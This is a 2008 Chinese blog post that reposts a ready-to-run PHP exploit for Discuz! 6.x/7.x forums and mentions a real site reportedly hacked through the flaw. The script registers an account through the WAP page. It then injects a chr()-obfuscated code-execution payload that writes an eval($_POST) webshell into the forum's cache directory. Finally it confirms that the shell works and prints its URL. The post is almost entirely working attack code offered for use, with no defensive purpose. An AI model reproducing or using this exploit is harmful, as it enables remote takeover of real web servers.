---
title: Discuz! 6.x/7.x SODB-2008-13 Exploit
description: Discuz!6.x/7.xSODB-2008-13Exploit，这个洞最近几天好像闹的比较厉害，今天看到华东黑客联盟（www.3hack.com）被黑，貌似就是因为这个洞的关系。废话不多说，直接帖代码：
date: 2008-11-16 10:26:30
category: 漏洞信息
tags: ['Discuz!', 'exploit']
post_id: 683
alias: Discuz!-6.x-7.x-SODB-2008-13-Exploit
ViewNums: 2897
---

[Discuz! 6.x/7.x SODB-2008-13 Exploit](/blog/discuz%21-6x-7x-sodb-2008-13-exploit)，这个洞最近几天好像闹的比较厉害，今天看到华东黑客联盟（[www.3hack.com](http://www.3hack.com)）被黑，貌似就是因为这个洞的关系。

废话不多说，直接帖代码：

#!/usr/bin/php
<?php
/**
* [Discuz! 6.x/7.x SODB-2008-13 Exp](/blog/discuz%21-6x-7x-sodb-2008-13-exploit)
* By www.80vul.com
* 文件中注释的变量值请自行修改
*/

$host = 'www.80vul.com';
// 服务器域名或IP
$path = '/discuz/';
// 程序所在的路径
$key  = 0;
// 上面的变量编辑好后，请将此处的值改为1

if (strpos($host, '://') !== false || strpos($path, '/') === false || $key !== 1)
exit("专业点好不,先看看里面的注释 -,-
");

error_reporting(7);
ini_set('max_execution_time', 0);

$key = time();
$cmd = 'action=register&username='.$key.'&password='.$key.'&email='.$key.'@80vul.com&_DCACHE=1';
$resp = send();

preg_match('/logout=yes&amp;formhash=[a-z0-9]{8}&amp;sid=([a-zA-Z0-9]{6})/', $resp, $sid);

if (!$sid)
exit("哦,大概是没有开启WAP注册吧 -,-
");

$cmd = 'stylejump[1]=1&styleid=1&inajax=1&transsidstatus=1&sid='.$sid[1].'&creditsformula=${${fputs(fopen(chr(46).chr(46).chr(47).chr(102).chr(111).chr(114).chr(117).chr(109).chr(100).chr(97).chr(116).chr(97).chr(47).chr(99).chr(97).chr(99).chr(104).chr(101).chr(47).chr(101).chr(118).chr(97).chr(108).chr(46).chr(112).chr(104).chr(112),chr(119).chr(43)),chr(60).chr(63).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(99).chr(93).chr(41).chr(63).chr(62).chr(56).chr(48).chr(118).chr(117).chr(108))}}';
send();

$shell = 'http://'.$host.$path.'forumdata/cache/eval.php';

if (file_get_contents($shell) == '80vul')
exit("好了,去看看你的WebShell吧: $shell
里面的代码是: <?eval($_POST[c])?>
别告诉我你不会用 -,-
");
else
exit("嗯,大概是该网站不存在漏洞,换一个吧 -,-
");

function send()
{
global $host, $path, $url, $cmd;

$data = "POST ".$path."wap/index.php  HTTP/1.1
";
$data .= "Accept: */*
";
$data .= "Accept-Language: zh-cn
";
$data .= "Referer: http://$host$path
";
$data .= "Content-Type: application/x-www-form-urlencoded
";
$data .= "User-Agent: Opera/9.62 (X11; Linux i686; U; zh-cn) Presto/2.1.1
";
$data .= "Host: $host
";
$data .= "Connection: Close
";
$data .= "Content-Length: ".strlen($cmd)."
";
$data .= $cmd;

$fp = fsockopen($host, 80);
fputs($fp, $data);

$resp = '';

while ($fp && !feof($fp))
$resp .= fread($fp, 1024);

return $resp;
}

?>

